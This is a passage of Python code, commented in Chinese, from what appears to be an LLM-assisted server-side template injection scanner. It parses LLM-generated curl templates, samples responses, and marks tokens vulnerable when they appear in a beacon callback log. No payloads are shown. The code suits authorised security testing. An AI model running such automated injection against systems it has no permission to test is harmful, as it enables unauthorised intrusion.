            self._log(f"{'~'*70}\n")

            # 5. 解析模板（复用现有的_parse_curl_templates）
            templates = self._parse_curl_templates(llm_output)
            return templates, llm_output

        except Exception as e:
            self._log(f"[Reflection] LLM call failed: {e}")
            import traceback
            self._log(traceback.format_exc())
            return [], ""

    def _sample_test_results(self, test_results: List[Dict], max_samples: int = 10) -> List[Dict]:
        """
        从测试结果中采样（去重 + 采样）

        Args:
            test_results: 完整测试结果列表
            max_samples: 最大采样数量

        Returns:
            采样后的结果列表
        """
        if not test_results:
            return []

        # 按响应哈希去重
        seen = {}
        for r in test_results:
            resp = r.get("response", "")
            key = resp[:500] if resp else "empty"  # 简单哈希
            if key not in seen:
                seen[key] = r

        deduped = list(seen.values())

        # 采样（最多max_samples个）
        if len(deduped) <= max_samples:
            return deduped
        else:
            # 均匀采样
            import random
            return random.sample(deduped, max_samples)

    def check_final_results(self) -> Dict[str, bool]:
        """检查最终结果（统一延迟检测）"""
        self._log(f"\n{'='*70}")
        self._log(f"[SSTI] Checking Final Results")
        self._log(f"{'='*70}\n")

        updates = {}

        for token in self.execution_records.keys():
            # 重新检查beacon日志
            is_vulnerable = check_beacon_detection(token)
            updates[token] = is_vulnerable

            if is_vulnerable:
                self._log(f"  ✓ Token {token}: VULNERABLE (detected in beacon log)")
            else:
                self._log(f"  ✗ Token {token}: SAFE (not in beacon log)")

        self._log(f"\n[SSTI] Final Summary:")
        successful = sum(1 for v in updates.values() if v)
        self._log(f"  Total tests: {len(updates)}")
        self._log(f"  Successful SSTI: {successful}")
        self._log(f"{'='*70}\n")

        return updates
